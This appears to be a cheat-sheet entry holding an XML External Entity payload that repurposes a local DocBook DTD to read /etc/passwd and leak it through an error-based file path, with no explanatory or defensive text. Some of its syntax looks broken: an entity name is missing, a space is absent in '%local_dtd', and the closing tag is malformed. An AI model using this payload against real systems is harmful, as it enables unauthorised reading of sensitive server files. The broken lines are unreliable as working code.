XML External Entity
===================

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE message [
	<!ENTITY %local_dtd SYSTEM "file://usr/share/yelp/dtd/docbookx.dtd">
	<!ENTITY % 	 '
		<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
		<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
			&#x25;eval;
			&#x25;error;
		'>
		%local_dtd;
]>
<message>...<message>
```
